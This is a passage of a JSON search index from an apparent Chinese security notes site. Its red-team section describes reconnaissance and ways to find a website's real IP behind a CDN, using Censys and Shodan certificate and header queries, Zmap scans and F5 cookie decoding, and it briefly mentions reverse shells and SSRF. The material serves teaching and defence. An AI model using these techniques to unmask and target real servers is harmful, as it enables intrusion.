\u7b2c6\u7bc7\uff1aShell\u75c5\u6bd2 [\u7b2c\u516d\u7ae0\uff1aWeb\u5b9e\u6218\u7bc7] \u7b2c1\u7bc7\uff1a\u7f51\u7ad9\u88ab\u690d\u5165Webshell \u7b2c2\u7bc7\uff1a\u95e8\u7f57\u5e01\u6076\u610f\u6316\u77ff \u7b2c3\u7bc7\uff1a\u6279\u91cf\u6302\u9ed1\u9875 \u7b2c4\u7bc7\uff1a\u65b0\u95fb\u6e90\u7f51\u7ad9\u52ab\u6301 \u7b2c5\u7bc7\uff1a\u79fb\u52a8\u7aef\u52ab\u6301 \u7b2c6\u7bc7\uff1a\u641c\u7d22\u5f15\u64ce\u52ab\u6301 \u7b2c7\u7bc7\uff1a\u7f51\u7ad9\u9996\u9875\u88ab\u7be1\u6539 \u7b2c8\u7bc7\uff1a\u7ba1\u7406\u5458\u8d26\u53f7\u88ab\u7be1\u6539 \u7b2c9\u7bc7\uff1a\u7f16\u8f91\u5668\u5165\u4fb5\u4e8b\u4ef6","title":"\u9879\u76ee\u76ee\u5f55"},{"location":"blueteam/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Untitled%201/","text":"","title":"Untitled 1"},{"location":"blueteam/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Untitled/","text":"","title":"Untitled"},{"location":"redteam/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/","text":"\u4fe1\u606f\u6536\u96c6 \u00b6 whois\u67e5\u8be2 \u6536\u96c6\u5b50\u57df\u540d \u7aef\u53e3\u626b\u63cf \u67e5\u627e\u771f\u5b9eip \u63a2\u6d4b\u65c1\u7ad9\u53caC\u6bb5 \u7f51\u7edc\u7a7a\u95f4\u641c\u7d22\u5f15\u64ce \u626b\u63cf\u654f\u611f\u76ee\u5f55/\u6587\u4ef6 \u6307\u7eb9\u8bc6\u522b \u975e\u5e38\u89c4\u64cd\u4f5c \u00b6 SSL/TLS\u8bc1\u4e66\u67e5\u8be2 \u00b6 \u00b6 \u67e5\u627e\u771f\u5b9eIP \u00b6 \u7ed5\u8fc7CDN\u7684\u591a\u79cd\u65b9\u6cd5\u5177\u4f53\u53ef\u4ee5\u53c2\u8003 https://www.cnblogs.com/qiudabai/p/9763739.html 0x01 \u9a8c\u8bc1\u662f\u5426\u5b58\u5728CDN \u00b6 \u65b9\u6cd51\uff1a\u5404\u79cd\u591a\u5730 ping \u7684\u670d\u52a1\uff0c\u67e5\u770b\u5bf9\u5e94 IP \u5730\u5740\u662f\u5426\u552f\u4e00 \u65b9\u6cd52\uff1a\u4f7f\u7528 nslookup \u8fdb\u884c\u68c0\u6d4b\uff0c\u539f\u7406\u540c\u4e0a\uff0c\u5982\u679c\u8fd4\u56de\u57df\u540d\u89e3\u6790\u5bf9\u5e94\u591a\u4e2a IP \u5730\u5740\u591a\u534a\u662f\u4f7f\u7528\u4e86 CDN 0x02 \u7ed5\u8fc7 CDN \u67e5\u627e\u7f51\u7ad9\u771f\u5b9e IP \u00b6 \u65b9\u6cd51:\u67e5\u8be2\u5386\u53f2DNS\u8bb0\u5f55 \u65b9\u6cd52:\u67e5\u8be2\u5b50\u57df\u540d \u5fae\u6b65\u5728\u7ebf Dnsdb\u67e5\u8be2\u6cd5 Google \u641c\u7d22 \u5404\u79cd\u5b50\u57df\u540d\u626b\u63cf\u5668 \u65b9\u6cd53\uff1a\u7f51\u7edc\u7a7a\u95f4\u5f15\u64ce\u641c\u7d22\u6cd5 \u5e38\u89c1\u7684\u6709\u4ee5\u524d\u7684\u949f\u9997\u4e4b\u773c\uff0c shodan \uff0c fofa\u641c\u7d22 \u3002\u4ee5fofa\u4e3a\u4f8b\uff0c\u53ea\u9700\u8f93\u5165\uff1atitle:\u201c\u7f51\u7ad9\u7684title\u5173\u952e\u5b57\u201d\u6216\u8005body\uff1a\u201c\u7f51\u7ad9\u7684body\u7279\u5f81\u201d\u5c31\u53ef\u4ee5\u627e\u51fafofa\u6536\u5f55\u7684\u6709\u8fd9\u4e9b\u5173\u952e\u5b57\u7684ip\u57df\u540d\uff0c\u5f88\u591a\u65f6\u5019\u80fd\u83b7\u53d6\u7f51\u7ad9\u7684\u771f\u5b9eip\uff0c\u5982\u56fe\uff1a \u65b9\u6cd54:\u5229\u7528SSL\u8bc1\u4e66\u5bfb\u627e\u771f\u5b9e\u539f\u59cbIP \u4f7f\u7528\u7ed9\u5b9a\u7684\u57df\u540d \u5047\u5982\u4f60\u5728xyz123boot.com\u4e0a\u6258\u7ba1\u4e86\u4e00\u4e2a\u670d\u52a1\uff0c\u539f\u59cb\u670d\u52a1\u5668IP\u662f136.23.63.44\u3002 \u800cCloudFlare\u5219\u4f1a\u4e3a\u4f60\u63d0\u4f9bDDoS\u4fdd\u62a4\uff0cWeb\u5e94\u7528\u7a0b\u5e8f\u9632\u706b\u5899\u548c\u5176\u4ed6\u4e00\u4e9b\u5b89\u5168\u670d\u52a1\uff0c\u4ee5\u4fdd\u62a4\u4f60\u7684\u670d\u52a1\u514d\u53d7\u653b\u51fb\u3002\u4e3a\u6b64\uff0c\u4f60\u7684Web\u670d\u52a1\u5668\u5c31\u5fc5\u987b\u652f\u6301SSL\u5e76\u5177\u6709\u8bc1\u4e66\uff0c\u6b64\u65f6CloudFlare\u4e0e\u4f60\u7684\u670d\u52a1\u5668\u4e4b\u95f4\u7684\u901a\u4fe1\uff0c\u5c31\u50cf\u4f60\u548cCloudFlare\u4e4b\u95f4\u7684\u901a\u4fe1\u4e00\u6837\uff0c\u4f1a\u88ab\u52a0\u5bc6\uff08\u5373\u6ca1\u6709\u7075\u6d3b\u7684SSL\u5b58\u5728\uff09\u3002\u8fd9\u770b\u8d77\u6765\u5f88\u5b89\u5168\uff0c\u4f46\u95ee\u9898\u662f\uff0c\u5f53\u4f60\u5728\u7aef\u53e3443\uff08 https://136.23.63.44:443\uff09\u4e0a\u76f4\u63a5\u8fde\u63a5\u5230IP\u65f6\uff0cSSL\u8bc1\u4e66\u5c31\u4f1a\u88ab\u66b4\u9732\u3002 \u6b64\u65f6\uff0c\u5982\u679c\u653b\u51fb\u8005\u626b\u63cf0.0.0.0/0\uff0c\u5373\u6574\u4e2a\u4e92\u8054\u7f51\uff0c\u4ed6\u4eec\u5c31\u53ef\u4ee5\u5728\u7aef\u53e3443\u4e0a\u83b7\u53d6\u5728xyz123boot.com\u4e0a\u7684\u6709\u6548\u8bc1\u4e66\uff0c\u8fdb\u800c\u83b7\u53d6\u63d0\u4f9b\u7ed9\u4f60\u7684Web\u670d\u52a1\u5668IP\u3002 \u76ee\u524dCensys\u5de5\u5177\u5c31\u80fd\u5b9e\u73b0\u5bf9\u6574\u4e2a\u4e92\u8054\u7f51\u7684\u626b\u63cf\uff0cCensys\u662f\u4e00\u6b3e\u7528\u4ee5\u641c\u7d22\u8054\u7f51\u8bbe\u5907\u4fe1\u606f\u7684\u65b0\u578b\u641c\u7d22\u5f15\u64ce\uff0c\u5b89\u5168\u4e13\u5bb6\u53ef\u4ee5\u4f7f\u7528\u5b83\u6765\u8bc4\u4f30\u4ed6\u4eec\u5b9e\u73b0\u65b9\u6848\u7684\u5b89\u5168\u6027\uff0c\u800c\u9ed1\u5ba2\u5219\u53ef\u4ee5\u4f7f\u7528\u5b83\u4f5c\u4e3a\u524d\u671f\u4fa6\u67e5\u653b\u51fb\u76ee\u6807\u3001\u6536\u96c6\u76ee\u6807\u4fe1\u606f\u7684\u5f3a\u5927\u5229\u5668\u3002Censys\u641c\u7d22\u5f15\u64ce\u80fd\u591f\u626b\u63cf\u6574\u4e2a\u4e92\u8054\u7f51\uff0cCensys\u6bcf\u5929\u90fd\u4f1a\u626b\u63cfIPv4\u5730\u5740\u7a7a\u95f4\uff0c\u4ee5\u641c\u7d22\u6240\u6709\u8054\u7f51\u8bbe\u5907\u5e76\u6536\u96c6\u76f8\u5173\u7684\u4fe1\u606f\uff0c\u5e76\u8fd4\u56de\u4e00\u4efd\u6709\u5173\u8d44\u6e90\uff08\u5982\u8bbe\u5907\u3001\u7f51\u7ad9\u548c\u8bc1\u4e66\uff09\u914d\u7f6e\u548c\u90e8\u7f72\u4fe1\u606f\u7684\u603b\u4f53\u62a5\u544a\u3002 \u800c\u653b\u51fb\u8005\u552f\u4e00\u9700\u8981\u505a\u7684\u5c31\u662f\u628a\u4e0a\u9762\u7528\u6587\u5b57\u63cf\u8ff0\u7684\u641c\u7d22\u8bcd\u7ffb\u8bd1\u6210\u5b9e\u9645\u7684\u641c\u7d22\u67e5\u8be2\u53c2\u6570\u3002 xyz123boot.com\u8bc1\u4e66\u7684\u641c\u7d22\u67e5\u8be2\u53c2\u6570\u4e3a\uff1aparsed.names\uff1axyz123boot.com \u53ea\u663e\u793a\u6709\u6548\u8bc1\u4e66\u7684\u67e5\u8be2\u53c2\u6570\u4e3a\uff1atags.raw\uff1atrusted \u653b\u51fb\u8005\u53ef\u4ee5\u5728Censys\u4e0a\u5b9e\u73b0\u591a\u4e2a\u53c2\u6570\u7684\u7ec4\u5408\uff0c\u8fd9\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528\u7b80\u5355\u7684\u5e03\u5c14\u903b\u8f91\u6765\u5b8c\u6210\u3002 \u7ec4\u5408\u540e\u7684\u641c\u7d22\u53c2\u6570\u4e3a\uff1aparsed.names: xyz123boot.com and tags.raw: trusted Censys\u5c06\u5411\u4f60\u663e\u793a\u7b26\u5408\u4e0a\u8ff0\u641c\u7d22\u6761\u4ef6\u7684\u6240\u6709\u6807\u51c6\u8bc1\u4e66\uff0c\u4ee5\u4e0a\u8fd9\u4e9b\u8bc1\u4e66\u662f\u5728\u626b\u63cf\u4e2d\u627e\u5230\u7684\u3002 \u8981\u9010\u4e2a\u67e5\u770b\u8fd9\u4e9b\u641c\u7d22\u7ed3\u679c\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u5355\u51fb\u53f3\u4fa7\u7684\u201cExplore\u201d\uff0c\u6253\u5f00\u5305\u542b\u591a\u4e2a\u5de5\u5177\u7684\u4e0b\u62c9\u83dc\u5355\u3002What's using this certificate? > IPv4 Hosts \u6b64\u65f6\uff0c\u653b\u51fb\u8005\u5c06\u770b\u5230\u4e00\u4e2a\u4f7f\u7528\u7279\u5b9a\u8bc1\u4e66\u7684IPv4\u4e3b\u673a\u5217\u8868\uff0c\u800c\u771f\u5b9e\u539f\u59cb IP\u5c31\u85cf\u5728\u5176\u4e2d\u3002 \u4f60\u53ef\u4ee5\u901a\u8fc7\u5bfc\u822a\u5230\u7aef\u53e3443\u4e0a\u7684IP\u6765\u9a8c\u8bc1\uff0c\u770b\u5b83\u662f\u5426\u91cd\u5b9a\u5411\u5230xyz123boot.com\uff1f\u6216\u5b83\u662f\u5426\u76f4\u63a5\u5728IP\u4e0a\u663e\u793a\u7f51\u7ad9\uff1f \u4f7f\u7528\u7ed9\u5b9a\u7684SSL\u8bc1\u4e66 \u5982\u679c\u4f60\u662f\u6267\u6cd5\u90e8\u95e8\u7684\u4eba\u5458\uff0c\u60f3\u8981\u627e\u51fa\u4e00\u4e2a\u9690\u85cf\u5728cheesecp5vaogohv.onion\u4e0b\u7684\u513f\u7ae5\u8272\u60c5\u7f51\u7ad9\u3002\u505a\u597d\u7684\u529e\u6cd5\uff0c\u5c31\u662f\u627e\u5230\u5176\u539f\u59cbIP\uff0c\u8fd9\u6837\u4f60\u5c31\u53ef\u4ee5\u8ffd\u8e2a\u5230\u5176\u6258\u7ba1\u7684\u670d\u52a1\u5668\uff0c\u751a\u81f3\u67e5\u5230\u80cc\u540e\u7684\u8fd0\u8425\u5546\u4ee5\u53ca\u91d1\u878d\u7ebf\u7d22\u3002 \u9690\u85cf\u670d\u52a1\u5177\u6709SSL\u8bc1\u4e66\uff0c\u8981\u67e5\u627e\u5b83\u4f7f\u7528\u7684IPv4\u4e3b\u673a\uff0c\u53ea\u9700\u5c06\"SHA1 fingerprint\"\uff08\u7b7e\u540d\u8bc1\u4e66\u7684sha1\u503c\uff09\u7c98\u8d34\u5230Censys IPv4\u4e3b\u673a\u641c\u7d22\u4e2d\uff0c\u5373\u53ef\u627e\u5230\u8bc1\u4e66\uff0c\u4f7f\u7528\u6b64\u65b9\u6cd5\u53ef\u4ee5\u8f7b\u677e\u627e\u5230\u914d\u7f6e\u9519\u8bef\u7684Web\u670d\u52a1\u5668\u3002 \u65b9\u6cd55:\u5229\u7528HTTP\u6807\u5934\u5bfb\u627e\u771f\u5b9e\u539f\u59cbIP \u501f\u52a9SecurityTrails\u8fd9\u6837\u7684\u5e73\u53f0\uff0c\u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u5728\u832b\u832b\u7684\u5927\u6570\u636e\u641c\u7d22\u5230\u81ea\u5df1\u7684\u76ee\u6807\uff0c\u751a\u81f3\u53ef\u4ee5\u901a\u8fc7\u6bd4\u8f83HTTP\u6807\u5934\u6765\u67e5\u627e\u5230\u539f\u59cb\u670d\u52a1\u5668\u3002 \u7279\u522b\u662f\u5f53\u7528\u6237\u62e5\u6709\u4e00\u4e2a\u975e\u5e38\u7279\u522b\u7684\u670d\u52a1\u5668\u540d\u79f0\u4e0e\u8f6f\u4ef6\u540d\u79f0\u65f6\uff0c\u653b\u51fb\u8005\u627e\u5230\u4f60\u5c31\u53d8\u5f97\u66f4\u5bb9\u6613\u3002 \u5982\u679c\u8981\u641c\u7d22\u7684\u6570\u636e\u76f8\u5f53\u591a\uff0c\u5982\u4e0a\u6240\u8ff0\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5728Censys\u4e0a\u7ec4\u5408\u641c\u7d22\u53c2\u6570\u3002\u5047\u8bbe\u4f60\u6b63\u5728\u4e0e1500\u4e2aWeb\u670d\u52a1\u5668\u5171\u4eab\u4f60\u7684\u670d\u52a1\u5668HTTP\u6807\u5934\uff0c\u8fd9\u4e9b\u670d\u52a1\u5668\u90fd\u53d1\u9001\u7684\u662f\u76f8\u540c\u7684\u6807\u5934\u53c2\u6570\u548c\u503c\u7684\u7ec4\u5408\u3002\u800c\u4e14\u4f60\u8fd8\u4f7f\u7528\u65b0\u7684PHP\u6846\u67b6\u53d1\u9001\u552f\u4e00\u7684HTTP\u6807\u5934\uff08\u4f8b\u5982\uff1aX-Generated-Via\uff1aXYZ\u6846\u67b6\uff09\uff0c\u76ee\u524d\u7ea6\u6709400\u540d\u7f51\u7ad9\u7ba1\u7406\u5458\u4f7f\u7528\u4e86\u8be5\u6846\u67b6\u3002\u800c\u6700\u7ec8\u7531\u4e09\u4e2a\u670d\u52a1\u5668\u7ec4\u6210\u7684\u4ea4\u96c6\uff0c\u53ea\u9700\u624b\u52a8\u64cd\u4f5c\u5c31\u53ef\u4ee5\u627e\u5230\u4e86IP\uff0c\u6574\u4e2a\u8fc7\u7a0b\u53ea\u9700\u8981\u51e0\u79d2\u949f\u3002 \u4f8b\u5982\uff0cCensys\u4e0a\u7528\u4e8e\u5339\u914d\u670d\u52a1\u5668\u6807\u5934\u7684\u641c\u7d22\u53c2\u6570\u662f80.http.get.headers.server :\uff0c\u67e5\u627e\u7531CloudFlare\u63d0\u4f9b\u670d\u52a1\u7684\u7f51\u7ad9\u7684\u53c2\u6570\u5982\u4e0b\uff1a 80.http.get.headers.server:cloudflare \u65b9\u6cd56:\u5229\u7528\u7f51\u7ad9\u8fd4\u56de\u7684\u5185\u5bb9\u5bfb\u627e\u771f\u5b9e\u539f\u59cbIP \u5982\u679c\u539f\u59cb\u670d\u52a1\u5668IP\u4e5f\u8fd4\u56de\u4e86\u7f51\u7ad9\u7684\u5185\u5bb9\uff0c\u90a3\u4e48\u53ef\u4ee5\u5728\u7f51\u4e0a\u641c\u7d22\u5927\u91cf\u7684\u76f8\u5173\u6570\u636e\u3002 \u6d4f\u89c8\u7f51\u7ad9\u6e90\u4ee3\u7801\uff0c\u5bfb\u627e\u72ec\u7279\u7684\u4ee3\u7801\u7247\u6bb5\u3002\u5728JavaScript\u4e2d\u4f7f\u7528\u5177\u6709\u8bbf\u95ee\u6216\u6807\u8bc6\u7b26\u53c2\u6570\u7684\u7b2c\u4e09\u65b9\u670d\u52a1\uff08\u4f8b\u5982Google Analytics\uff0creCAPTCHA\uff09\u662f\u653b\u51fb\u8005\u7ecf\u5e38\u4f7f\u7528\u7684\u65b9\u6cd5\u3002 \u4ee5\u4e0b\u662f\u4eceHackTheBox\u7f51\u7ad9\u83b7\u53d6\u7684Google Analytics\u8ddf\u8e2a\u4ee3\u7801\u793a\u4f8b\uff1a ga\uff08'create'\uff0c'UA-93577176-1'\uff0c'auto'\uff09; \u53ef\u4ee5\u4f7f\u752880.http.get.body\uff1a\u53c2\u6570\u901a\u8fc7body/source\u8fc7\u6ee4Censys\u6570\u636e\uff0c\u4e0d\u5e78\u7684\u662f\uff0c\u6b63\u5e38\u7684\u641c\u7d22\u5b57\u6bb5\u6709\u5c40\u9650\u6027\uff0c\u4f46\u4f60\u53ef\u4ee5\u5728Censys\u8bf7\u6c42\u7814\u7a76\u8bbf\u95ee\u6743\u9650\uff0c\u8be5\u6743\u9650\u5141\u8bb8\u4f60\u901a\u8fc7Google BigQuery\u8fdb\u884c\u66f4\u5f3a\u5927\u7684\u67e5\u8be2\u3002 Shodan\u662f\u4e00\u79cd\u7c7b\u4f3c\u4e8eCensys\u7684\u670d\u52a1\uff0c\u4e5f\u63d0\u4f9b\u4e86http.html\u641c\u7d22\u53c2\u6570\u3002 \u641c\u7d22\u793a\u4f8b\uff1a https://www.shodan.io/search?query=http.html%3AUA-32023260-1 \u65b9\u6cd57:\u4f7f\u7528\u56fd\u5916\u4e3b\u673a\u89e3\u6790\u57df\u540d \u65b9\u6cd58:\u7f51\u7ad9\u6f0f\u6d1e\u67e5\u627e 1\uff09\u76ee\u6807\u654f\u611f\u6587\u4ef6\u6cc4\u9732\uff0c\u4f8b\u5982\uff1a.git\u6587\u4ef6\u6cc4\u9732\uff0c.svn\u6587\u4ef6\u6cc4\u9732\uff0cphpinfo\u4e4b\u7c7b\u7684\u63a2\u9488\u3001GitHub\u4fe1\u606f\u6cc4\u9732\u7b49\u3002 2\uff09XSS\u76f2\u6253\uff0c\u547d\u4ee4\u6267\u884c\u53cd\u5f39shell\uff0cSSRF\u7b49\u3002 3\uff09\u65e0\u8bba\u662f\u7528\u793e\u5de5\u8fd8\u662f\u5176\u4ed6\u624b\u6bb5\uff0c\u62ff\u5230\u4e86\u76ee\u6807\u7f51\u7ad9\u7ba1\u7406\u5458\u5728CDN\u7684\u8d26\u53f7\uff0c\u4ece\u800c\u5728\u4eceCDN\u7684\u914d\u7f6e\u4e2d\u627e\u5230\u7f51\u7ad9\u7684\u771f\u5b9eIP\u3002 \u65b9\u6cd59:\u7f51\u7ad9\u90ae\u4ef6\u8ba2\u9605\u67e5\u627e \u65b9\u6cd510\uff1a\u7528 Zmap \u626b\u5168\u7f51 \u9700\u8981\u627e xiaix.me \u7f51\u7ad9\u7684\u771f\u5b9e IP\uff0c\u6211\u4eec\u9996\u5148\u4ece apnic \u83b7\u53d6 IP \u6bb5\uff0c\u7136\u540e\u4f7f\u7528 Zmap \u7684 banner-grab \u626b\u63cf\u51fa\u6765 80 \u7aef\u53e3\u5f00\u653e\u7684\u4e3b\u673a\u8fdb\u884c banner \u6293\u53d6\uff0c\u6700\u540e\u5728 http-req \u4e2d\u7684 Host \u5199 xiaix.me \u65b9\u6cd511\uff1aF5 LTM\u89e3\u7801\u6cd5 \u5f53\u670d\u52a1\u5668\u4f7f\u7528F5 LTM\u505a\u8d1f\u8f7d\u5747\u8861\u65f6\uff0c\u901a\u8fc7\u5bf9set-cookie\u5173\u952e\u5b57\u7684\u89e3\u7801\u771f\u5b9eip\u4e5f\u53ef\u88ab\u83b7\u53d6\uff0c\u4f8b\u5982\uff1aSet-Cookie: BIGipServerpool_8.29_8030=487098378.24095.0000\uff0c\u5148\u628a\u7b2c\u4e00\u5c0f\u8282\u7684\u5341\u8fdb\u5236\u6570\u5373487098378\u53d6\u51fa\u6765\uff0c\u7136\u540e\u5c06\u5176\u8f6c\u4e3a\u5341\u516d\u8fdb\u5236\u65701d08880a\uff0c\u63a5\u7740\u4ece\u540e\u81f3\u524d\uff0c\u4ee5\u6b64\u53d6\u56db\u4f4d\u6570\u51fa\u6765\uff0c\u4e5f\u5c31\u662f0a.88.08.1d\uff0c\u6700\u540e\u4f9d\u6b21\u628a\u4ed6\u4eec\u8f6c\u4e3a\u5341\u8fdb\u5236\u657010.136.8.29\uff0c\u4e5f\u5c31\u662f\u6700\u540e\u7684\u771f\u5b9eip 0 x 0 5 \u65c1 \u7ad9 \u548cC\u6bb5","title":"\u4fe1\u606f\u6536\u96c6"},{"location":"redteam/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_1","text":"whois\u67e5\u8be2 \u6536\u96c6\u5b50\u57df\u540d \u7aef\u53e3\u626b\u63cf \u67e5\u627e\u771f\u5b9eip \u63a2\u6d4b\u65c1\u7ad9\u53caC\u6bb5 \u7f51\u7edc\u7a7a\u95f4\u641c\u7d22\u5f15\u64ce \u626b\u63cf\u654f\u611f\u76ee\u5f55/\u6587\u4ef6 \u6307\u7eb9\u8bc6\u522b","title":"\u4fe1\u606f\u6536\u96c6"},{"location":"redteam/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_2","text":"","title":"\u975e\u5e38\u89c4\u64cd\u4f5c"},{"location":"redteam/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#ssltls","text":"","title":"SSL/TLS\u8bc1\u4e66\u67e5\u8be2"},{"location":"redteam/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_3","text":"","title":""},{"location":"redteam/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#ip","text":"\u7ed5\u8fc7CDN\u7684\u591a\u79cd\u65b9\u6cd5\u5177\u4f53\u53ef\u4ee5\u53c2\u8003 https://www.cnblogs.com/qiudabai/p/9763739.html","title":"\u67e5\u627e\u771f\u5b9eIP"},{"location":"redteam/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#0x01-cdn","text":"\u65b9\u6cd51\uff1a\u5404\u79cd\u591a\u5730 ping \u7684\u670d\u52a1\uff0c\u67e5\u770b\u5bf9\u5e94 IP \u5730\u5740\u662f\u5426\u552f\u4e00 \u65b9\u6cd52\uff1a\u4f7f\u7528 nslookup \u8fdb\u884c\u68c0\u6d4b\uff0c\u539f\u7406\u540c\u4e0a\uff0c\u5982\u679c\u8fd4\u56de\u57df\u540d\u89e3\u6790\u5bf9\u5e94\u591a\u4e2a IP \u5730\u5740\u591a\u534a\u662f\u4f7f\u7528\u4e86 CDN","title":"0x01 \u9a8c\u8bc1\u662f\u5426\u5b58\u5728CDN"},{"location":"redteam/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#0x02-cdn-ip","text":"\u65b9\u6cd51:\u67e5\u8be2\u5386\u53f2DNS\u8bb0\u5f55 \u65b9\u6cd52:\u67e5\u8be2\u5b50\u57df\u540d \u5fae\u6b65\u5728\u7ebf Dnsdb\u67e5\u8be2\u6cd5 Google \u641c\u7d22 \u5404\u79cd\u5b50\u57df\u540d\u626b\u63cf\u5668 \u65b9\u6cd53\uff1a\u7f51\u7edc\u7a7a\u95f4\u5f15\u64ce\u641c\u7d22\u6cd5 \u5e38\u89c1\u7684\u6709\u4ee5\u524d\u7684\u949f\u9997\u4e4b\u773c\uff0c shodan \uff0c fofa\u641c\u7d22 \u3002\u4ee5fofa\u4e3a\u4f8b\uff0c\u53ea\u9700\u8f93\u5165\uff1atitle:\u201c\u7f51\u7ad9\u7684title\u5173\u952e\u5b57\u201d\u6216\u8005body\uff1a\u201c\u7f51\u7ad9\u7684body\u7279\u5f81\u201d\u5c31\u53ef\u4ee5\u627e\u51fafofa\u6536\u5f55\u7684\u6709\u8fd9\u4e9b\u5173\u952e\u5b57\u7684ip\u57df\u540d\uff0c\u5f88\u591a\u65f6\u5019\u80fd\u83b7\u53d6\u7f51\u7ad9\u7684\u771f\u5b9eip\uff0c\u5982\u56fe\uff1a \u65b9\u6cd54:\u5229\u7528SSL\u8bc1\u4e66\u5bfb\u627e\u771f\u5b9e\u539f\u59cbIP \u4f7f\u7528\u7ed9\u5b9a\u7684\u57df\u540d \u5047\u5982\u4f60\u5728xyz123boot.com\u4e0a\u6258\u7ba1\u4e86\u4e00\u4e2a\u670d\u52a1\uff0c\u539f\u59cb\u670d\u52a1\u5668IP\u662f136.23.63.44\u3002 \u800cCloudFlare\u5219\u4f1a\u4e3a\u4f60\u63d0\u4f9bDDoS\u4fdd\u62a4\uff0cWeb\u5e94\u7528\u7a0b\u5e8f\u9632\u706b\u5899\u548c\u5176\u4ed6\u4e00\u4e9b\u5b89\u5168\u670d\u52a1\uff0c\u4ee5\u4fdd\u62a4\u4f60\u7684\u670d\u52a1\u514d\u53d7\u653b\u51fb\u3002\u4e3a\u6b64\uff0c\u4f60\u7684Web\u670d\u52a1\u5668\u5c31\u5fc5\u987b\u652f\u6301SSL\u5e76\u5177\u6709\u8bc1\u4e66\uff0c\u6b64\u65f6CloudFlare\u4e0e\u4f60\u7684\u670d\u52a1\u5668\u4e4b\u95f4\u7684\u901a\u4fe1\uff0c\u5c31\u50cf\u4f60\u548cCloudFlare\u4e4b\u95f4\u7684\u901a\u4fe1\u4e00\u6837\uff0c\u4f1a\u88ab\u52a0\u5bc6\uff08\u5373\u6ca1\u6709\u7075\u6d3b\u7684SSL\u5b58\u5728\uff09\u3002\u8fd9\u770b\u8d77\u6765\u5f88\u5b89\u5168\uff0c\u4f46\u95ee\u9898\u662f\uff0c\u5f53\u4f60\u5728\u7aef\u53e3443\uff08 https://136.23.63.44:443\uff09\u4e0a\u76f4\u63a5\u8fde\u63a5\u5230IP\u65f6\uff0cSSL\u8bc1\u4e66\u5c31\u4f1a\u88ab\u66b4\u9732\u3002 \u6b64\u65f6\uff0c\u5982\u679c\u653b\u51fb\u8005\u626b\u63cf0.0.0.0/0\uff0c\u5373\u6574\u4e2a\u4e92\u8054\u7f51\uff0c\u4ed6\u4eec\u5c31\u53ef\u4ee5\u5728\u7aef\u53e3443\u4e0a\u83b7\u53d6\u5728xyz123boot.com\u4e0a\u7684\u6709\u6548\u8bc1\u4e66\uff0c\u8fdb\u800c\u83b7\u53d6\u63d0\u4f9b\u7ed9\u4f60\u7684Web\u670d\u52a1\u5668IP\u3002 \u76ee\u524dCensys\u5de5\u5177\u5c31\u80fd\u5b9e\u73b0\u5bf9\u6574\u4e2a\u4e92\u8054\u7f51\u7684\u626b\u63cf\uff0cCensys\u662f\u4e00\u6b3e\u7528\u4ee5\u641c\u7d22\u8054\u7f51\u8bbe\u5907\u4fe1\u606f\u7684\u65b0\u578b\u641c\u7d22\u5f15\u64ce\uff0c\u5b89\u5168\u4e13\u5bb6\u53ef\u4ee5\u4f7f\u7528\u5b83\u6765\u8bc4\u4f30\u4ed6\u4eec\u5b9e\u73b0\u65b9\u6848\u7684\u5b89\u5168\u6027\uff0c\u800c\u9ed1\u5ba2\u5219\u53ef\u4ee5\u4f7f\u7528\u5b83\u4f5c\u4e3a\u524d\u671f\u4fa6\u67e5\u653b\u51fb\u76ee\u6807\u3001\u6536\u96c6\u76ee\u6807\u4fe1\u606f\u7684\u5f3a\u5927\u5229\u5668\u3002Censys\u641c\u7d22\u5f15\u64ce\u80fd\u591f\u626b\u63cf\u6574\u4e2a\u4e92\u8054\u7f51\uff0cCensys\u6bcf\u5929\u90fd\u4f1a\u626b\u63cfIPv4\u5730\u5740\u7a7a\u95f4\uff0c\u4ee5\u641c\u7d22\u6240\u6709\u8054\u7f51\u8bbe\u5907\u5e76\u6536\u96c6\u76f8\u5173\u7684\u4fe1\u606f\uff0c\u5e76\u8fd4\u56de\u4e00\u4efd\u6709\u5173\u8d44\u6e90\uff08\u5982\u8bbe\u5907\u3001\u7f51\u7ad9\u548c\u8bc1\u4e66\uff09\u914d\u7f6e\u548c\u90e8\u7f72\u4fe1\u606f\u7684\u603b\u4f53\u62a5\u544a\u3002 \u800c\u653b\u51fb\u8005\u552f\u4e00\u9700\u8981\u505a\u7684\u5c31\u662f\u628a\u4e0a\u9762\u7528\u6587\u5b57\u63cf\u8ff0\u7684\u641c\u7d22\u8bcd\u7ffb\u8bd1\u6210\u5b9e\u9645\u7684\u641c\u7d22\u67e5\u8be2\u53c2\u6570\u3002 xyz123boot.com\u8bc1\u4e66\u7684\u641c\u7d22\u67e5\u8be2\u53c2\u6570\u4e3a\uff1aparsed.names\uff1axyz123boot.com \u53ea\u663e\u793a\u6709\u6548\u8bc1\u4e66\u7684\u67e5\u8be2\u53c2\u6570\u4e3a\uff1atags.raw\uff1atrusted \u653b\u51fb\u8005\u53ef\u4ee5\u5728Censys\u4e0a\u5b9e\u73b0\u591a\u4e2a\u53c2\u6570\u7684\u7ec4\u5408\uff0c\u8fd9\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528\u7b80\u5355\u7684\u5e03\u5c14\u903b\u8f91\u6765\u5b8c\u6210\u3002 \u7ec4\u5408\u540e\u7684\u641c\u7d22\u53c2\u6570\u4e3a\uff1aparsed.names: xyz123boot.com and tags.raw: trusted Censys\u5c06\u5411\u4f60\u663e\u793a\u7b26\u5408\u4e0a\u8ff0\u641c\u7d22\u6761\u4ef6\u7684\u6240\u6709\u6807\u51c6\u8bc1\u4e66\uff0c\u4ee5\u4e0a\u8fd9\u4e9b\u8bc1\u4e66\u662f\u5728\u626b\u63cf\u4e2d\u627e\u5230\u7684\u3002 